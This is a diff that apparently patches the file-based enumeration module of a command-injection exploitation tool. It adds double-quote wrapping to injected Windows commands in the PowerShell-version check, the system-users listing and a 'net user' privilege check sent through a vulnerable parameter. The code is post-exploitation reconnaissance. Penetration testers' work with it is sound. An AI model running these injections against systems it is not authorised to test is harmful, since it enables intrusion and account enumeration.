@@ -21,6 +21,7 @@ from src.utils import menu
 from src.utils import settings
 from src.utils import session_handler
 
+from src.core.injections.controller import checks
 from src.thirdparty.colorama import Fore, Back, Style, init
 from src.core.injections.semiblind.techniques.file_based import fb_injector
 
@@ -35,6 +36,8 @@ def powershell_version(separator, payload, TAG, delay, prefix, suffix, http_requ
   cmd = settings.PS_VERSION
   if alter_shell:
     cmd = cmd.replace("'","\\'")
+  else:
+    cmd = "\"" + cmd + "\""
   #Command execution results.
   response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
   # Evaluate injection results.
@@ -198,7 +201,9 @@ def system_users(separator, payload, TAG, delay, prefix, suffix, http_request_me
     settings.SYS_USERS = settings.SYS_USERS + "-replace('\s+',' '))"
     if alter_shell:
       settings.SYS_USERS = settings.SYS_USERS.replace("'","\\'")
-  cmd = settings.SYS_USERS 
+    else:  
+      settings.SYS_USERS = "\"" + settings.SYS_USERS + "\"" 
+  cmd = settings.SYS_USERS
   response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
   if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:
     # Evaluate injection results.
@@ -234,6 +239,8 @@ def system_users(separator, payload, TAG, delay, prefix, suffix, http_request_me
             cmd = "powershell.exe -InputFormat none write-host (([string]$(net user " + sys_users_list[user] + ")[22..($(net user " + sys_users_list[user] + ").length-3)]).replace('Local Group Memberships','').replace('*','').Trim()).replace(' ','')"
             if alter_shell:
               cmd = cmd.replace("'","\\'")
+            else:
+              cmd = "\"" + cmd + "\""
             response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
             check_privs = fb_injector.injection_results(url, OUTPUT_TEXTFILE, delay)
             check_privs = "".join(str(p) for p in check_privs).strip()
